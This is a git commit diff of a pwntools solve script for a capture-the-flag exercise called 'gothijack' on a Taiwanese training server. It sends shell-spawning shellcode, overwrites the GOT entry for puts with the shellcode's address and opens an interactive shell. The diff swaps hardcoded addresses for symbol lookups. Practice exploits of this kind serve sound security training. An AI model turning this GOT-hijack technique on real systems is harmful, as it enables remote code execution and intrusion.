0bd6780ae5719f6e99a195b2e37d5d71e8b7c1a7
wh00am1 <xthehacker666@gmail.com>
2020-09-16 07:41:43 -0400

    update isc.taiwan-te.ch

--- isc.taiwan-te.ch/gothijack/solve.py
+++ isc.taiwan-te.ch/gothijack/solve.py
@@ -9,11 +9,9 @@ f = ELF('./gothijack')
 
 p = remote('isc.taiwan-te.ch', 10003)
 
-p.sendlineafter('?', asm(shellcraft.sh()))
-sleep(0.5)
-p.sendline('0x601018')
-sleep(0.5)
-p.sendline('0x601080')
+p.sendlineafter("What's you name?\n", asm(shellcraft.sh()))
+p.sendlineafter("Where do you want to write?\n", str(f.got['puts']))
+p.sendlineafter("Data:", p64(f.symbols['name']))
 
 p.interactive()
 p.close()
